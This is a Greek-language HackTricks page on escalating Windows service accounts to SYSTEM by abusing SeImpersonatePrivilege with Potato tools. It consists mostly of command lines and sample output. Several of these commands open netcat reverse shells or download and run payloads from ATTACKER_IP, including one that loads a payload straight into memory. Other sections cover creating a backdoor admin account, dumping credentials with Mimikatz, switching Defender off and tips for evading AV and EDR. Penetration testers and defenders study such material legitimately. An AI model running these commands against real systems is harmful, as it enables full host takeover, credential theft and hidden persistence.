# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **Το JuicyPotato δεν λειτουργεί** σε Windows Server 2019 και Windows 10 build 1809 και νεότερες εκδόσεις. Ωστόσο, τα [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** μπορούν να χρησιμοποιηθούν για **την αξιοποίηση των ίδιων δικαιωμάτων και την απόκτηση πρόσβασης επιπέδου `NT AUTHORITY\SYSTEM`**. Αυτή η [δημοσίευση ιστολογίου](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) αναλύει λεπτομερώς το εργαλείο `PrintSpoofer`, το οποίο μπορεί να χρησιμοποιηθεί για την κατάχρηση δικαιωμάτων impersonation σε hosts με Windows 10 και Server 2019, όπου το JuicyPotato δεν λειτουργεί πλέον.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Μια σύγχρονη εναλλακτική που συντηρείται συχνά το 2024–2025 είναι το SigmaPotato (fork του GodPotato), το οποίο προσθέτει χρήση in-memory/.NET reflection και εκτεταμένη υποστήριξη λειτουργικών συστημάτων. Δείτε τη σύντομη χρήση παρακάτω και το repository στις References.

Σχετικές σελίδες για το υπόβαθρο και τις manual τεχνικές:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Απαιτήσεις και συνηθισμένες παγίδες

Όλες οι παρακάτω τεχνικές βασίζονται στην κατάχρηση μιας privileged υπηρεσίας με δυνατότητα impersonation, από ένα context που διαθέτει ένα από τα εξής δικαιώματα:

- SeImpersonatePrivilege (το συνηθέστερο) ή SeAssignPrimaryTokenPrivilege
- Δεν απαιτείται high integrity εάν το token διαθέτει ήδη SeImpersonatePrivilege (συνηθισμένο για πολλούς service accounts, όπως IIS AppPool, MSSQL κ.λπ.)

Ελέγξτε γρήγορα τα δικαιώματα:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- Αν το shell σας εκτελείται με restricted token χωρίς `SeImpersonatePrivilege` (συνηθισμένο για Local Service/Network Service σε ορισμένα contexts), ανακτήστε τα default privileges του account χρησιμοποιώντας το FullPowers και, στη συνέχεια, εκτελέστε ένα Potato. Παράδειγμα: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- Το PrintSpoofer απαιτεί να εκτελείται η υπηρεσία Print Spooler και να είναι προσβάσιμη μέσω του local RPC endpoint (spoolss). Σε hardened environments όπου το Spooler είναι απενεργοποιημένο μετά το PrintNightmare, προτιμήστε RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- Το RoguePotato απαιτεί έναν OXID resolver προσβάσιμο μέσω TCP/135. Αν το egress είναι blocked, χρησιμοποιήστε redirector/port-forwarder (δείτε το παρακάτω παράδειγμα). Τα παλαιότερα builds απαιτούσαν το flag `-f`.
- Τα EfsPotato/SharpEfsPotato κάνουν abuse του MS-EFSR· αν ένα pipe είναι blocked, δοκιμάστε εναλλακτικά pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Το error 0x6d3 κατά το RpcBindingSetAuthInfo συνήθως υποδεικνύει άγνωστη/μη υποστηριζόμενη RPC authentication service· δοκιμάστε διαφορετικό pipe/transport ή βεβαιωθείτε ότι η target service εκτελείται.
- Forks τύπου “Kitchen-sink”, όπως το DeadPotato, περιλαμβάνουν επιπλέον payload modules (Mimikatz/SharpHound/Defender off) που γράφουν στον δίσκο· αναμένετε υψηλότερο EDR detection σε σύγκριση με τα slim originals.

## Γρήγορο Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Σημειώσεις:
- Μπορείτε να χρησιμοποιήσετε το `-i` για να εκκινήσετε μια interactive process στην τρέχουσα κονσόλα ή το `-c` για να εκτελέσετε ένα one-liner.
- Απαιτεί την υπηρεσία Spooler. Αν είναι απενεργοποιημένη, αυτό θα αποτύχει.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Αν η εξερχόμενη θύρα 135 είναι blocked, κάντε pivot στον OXID resolver μέσω socat στο redirector:<sup>[[9]](#references)</sup>
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

Το PrintNotifyPotato είναι ένα νεότερο COM abuse primitive που κυκλοφόρησε στα τέλη του 2022 και στοχεύει την υπηρεσία **PrintNotify** αντί για τις Spooler/BITS. Το binary δημιουργεί το COM server του PrintNotify, αντικαθιστά ένα fake `IUnknown` και στη συνέχεια ενεργοποιεί ένα privileged callback μέσω του `CreatePointerMoniker`. Όταν η υπηρεσία PrintNotify (η οποία εκτελείται ως **SYSTEM**) συνδέεται πίσω, η διεργασία αντιγράφει το token που επιστράφηκε και εκκινεί το παρεχόμενο payload με πλήρη privileges.<sup>[[13]](#references)</sup>

Βασικές operational σημειώσεις:

* Λειτουργεί σε Windows 10/11 και Windows Server 2012–2022, εφόσον είναι εγκατεστημένη η υπηρεσία Print Workflow/PrintNotify (υπάρχει ακόμη και όταν το legacy Spooler είναι απενεργοποιημένο μετά το PrintNightmare).
* Απαιτεί το calling context να διαθέτει `SeImpersonatePrivilege` (συνηθισμένο για IIS APPPOOL, MSSQL και service accounts scheduled tasks).
* Δέχεται είτε direct command είτε interactive mode, ώστε να παραμείνετε μέσα στο αρχικό console. Παράδειγμα:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Επειδή βασίζεται αποκλειστικά σε COM, δεν απαιτούνται named-pipe listeners ή external redirectors, γεγονός που το καθιστά drop-in replacement σε hosts όπου το Defender μπλοκάρει το RPC binding του RoguePotato.

Operators όπως η Ink Dragon εκτελούν το PrintNotifyPotato αμέσως μετά την απόκτηση ViewState RCE στο SharePoint, για να κάνουν pivot από το worker `w3wp.exe` σε SYSTEM πριν εγκαταστήσουν το ShadowPad.<sup>[[14]](#references)</sup>

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Συμβουλή: Αν ένα pipe αποτύχει ή το EDR το μπλοκάρει, δοκιμάστε τα άλλα υποστηριζόμενα pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Σημειώσεις:
- Λειτουργεί σε Windows 8/8.1–11 και Server 2012–2022 όταν υπάρχει το SeImpersonatePrivilege.
- Κατεβάστε το binary που αντιστοιχεί στο εγκατεστημένο runtime (π.χ. `GodPotato-NET4.exe` σε σύγχρονο Server 2022).
- Αν το αρχικό execution primitive είναι ένα webshell/UI με σύντομα timeouts, αποθηκεύστε το payload ως script και ζητήστε από το GodPotato να το εκτελέσει αντί για μια μεγάλη inline εντολή.<sup>[[12]](#references)</sup>

Γρήγορο pattern staging από ένα εγγράψιμο IIS webroot:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

Το DCOMPotato παρέχει δύο παραλλαγές που στοχεύουν αντικείμενα service DCOM τα οποία χρησιμοποιούν από προεπιλογή το RPC_C_IMP_LEVEL_IMPERSONATE. Κάντε build ή χρησιμοποιήστε τα παρεχόμενα binaries και εκτελέστε την εντολή σας:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (updated GodPotato fork)

Το SigmaPotato προσθέτει σύγχρονες δυνατότητες, όπως εκτέλεση in-memory μέσω .NET reflection και ένα PowerShell reverse shell helper.<sup>[[8]](#references)</sup>
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Επιπλέον δυνατότητες στις εκδόσεις 2024–2025 (v1.2.x):
- Ενσωματωμένο flag για reverse shell `--revshell` και κατάργηση του ορίου των 1024 χαρακτήρων του PowerShell, ώστε να μπορείτε να εκτελείτε μεγάλα AMSI-bypassing payloads με μία εντολή.
- Syntax φιλικό προς reflection (`[SigmaPotato]::Main()`), καθώς και ένα rudimentary τέχνασμα AV evasion μέσω `VirtualAllocExNuma()` για την παραπλάνηση απλών heuristics.
- Ξεχωριστό `SigmaPotatoCore.exe` μεταγλωττισμένο για .NET 2.0, για περιβάλλοντα PowerShell Core.

### DeadPotato (GodPotato rework του 2024 με modules)

Το DeadPotato διατηρεί την αλυσίδα GodPotato OXID/DCOM impersonation, αλλά ενσωματώνει post-exploitation helpers, ώστε οι operators να μπορούν να αποκτήσουν άμεσα SYSTEM και να εκτελέσουν persistence/collection χωρίς πρόσθετα εργαλεία.<sup>[[15]](#references)</sup>

Συνηθισμένα modules (όλα απαιτούν SeImpersonatePrivilege):

- `-cmd "<cmd>"` — εκτέλεση αυθαίρετης εντολής ως SYSTEM.
- `-rev <ip:port>` — γρήγορο reverse shell.
- `-newadmin user:pass` — δημιουργία local admin για persistence.
- `-mimi sam|lsa|all` — απόθεση και εκτέλεση του Mimikatz για dump credentials (αγγίζει τον δίσκο και είναι noisy).
- `-sharphound` — εκτέλεση συλλογής SharpHound ως SYSTEM.
- `-defender off` — απενεργοποίηση της προστασίας πραγματικού χρόνου του Defender (πολύ noisy).

Παραδείγματα one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Επειδή περιλαμβάνει επιπλέον binaries, αναμένετε περισσότερες ανιχνεύσεις από AV/EDR· χρησιμοποιήστε το πιο slim GodPotato/SigmaPotato όταν έχει σημασία το stealth.

## Αναφορές

- [1] [PrintSpoofer – Κατάχρηση δικαιωμάτων impersonation στα Windows 10 και Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [Όχι άλλο JuicyPotato; Παλιά ιστορία, καλωσόρισες RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Επαναφορά των προεπιλεγμένων δικαιωμάτων token για service accounts](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → NTFS junction στο webroot για RCE → FullPowers + GodPotato σε SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice macro → IIS webshell → GodPotato σε SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Inside Ink Dragon: Αποκάλυψη του relay network και της εσωτερικής λειτουργίας μιας stealthy offensive operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – Rework του GodPotato με ενσωματωμένα post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
